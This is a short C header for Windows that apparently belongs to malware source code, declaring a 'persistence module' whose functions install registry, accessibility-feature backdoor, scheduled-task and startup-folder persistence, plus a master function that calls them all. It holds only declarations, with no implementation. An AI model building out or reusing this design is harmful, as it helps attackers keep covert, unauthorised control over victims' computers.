#pragma once
#ifndef PERSISTENCE_H
#define PERSISTENCE_H
#include <windows.h>
#include <stdbool.h>

/* ============================================================
 * PERSISTENCE MODULE
 * Installs multi-layer persistence mechanisms
 * ============================================================ */

/* Core Persistence Installation */
bool PersistenceInstallRegistry(void);
bool PersistenceInstallAccessibilityBackdoor(void);
bool PersistenceInstallScheduledTask(void);
bool PersistenceInstallStartupFolder(void);

/* Master function - calls all persistence methods */
bool PersistenceInstallAll(void);


#endif /* PERSISTENCE_H*/
